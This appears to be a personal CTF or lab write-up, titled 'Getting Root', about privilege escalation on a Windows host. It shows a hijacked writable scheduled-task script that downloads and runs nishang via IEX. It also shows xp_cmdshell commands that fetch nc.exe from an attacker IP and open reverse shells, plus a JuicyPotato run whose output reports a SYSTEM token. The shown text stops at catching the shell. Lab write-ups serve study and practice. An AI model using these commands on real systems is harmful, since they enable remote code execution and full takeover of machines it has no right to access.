# Getting Root
SPBestWarmUp.ps1 is writeable and SPBestWarmUp.xml is calling a task. Gonna write SPBestWarmUp.ps1 to reverse shell with file SPBestWarmUp.ps1
![[Pasted image 20211116132619.png]]

Tasks run every hour
```powershell
echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/nishang.ps1')" > SPBestWarmUp.ps1
```


Run PowerUp.ps1
![[Pasted image 20211116140521.png]]
![[Pasted image 20211116140619.png]]


### another way to exploit is using juicy potato
On SQSH
```
xp_cmdshell 'dir C:\';
go

xp_cmdshell 'mkdir c:\boo';

xp_cmdshell 'powershell Invoke-WebRequest -uri http://10.10.14.17/nc.exe -outfile c:\boo\nc.exe';
go

xp_cmdshell 'c:\boo\nc.exe 10.10.14.17 6969 -e cmd';
go
```


Write shell.bat and copy it with ‘iwr’ to target:
```
c:\boo>type shell.bat
type shell.bat
c:\boo\nc.exe 10.10.14.17 6868 -e cmd
```

Now run the Juicy-Potato exploit.

```
c:\boo>.\jp.exe -l 9001 -t * -p c:\boo\shell.bat -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"
.\jp.exe -l 9001 -t * -p c:\boo\shell.bat -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"
Testing {7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381} 9001
......
[+] authresult 0
{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

and catch the System privileged shell: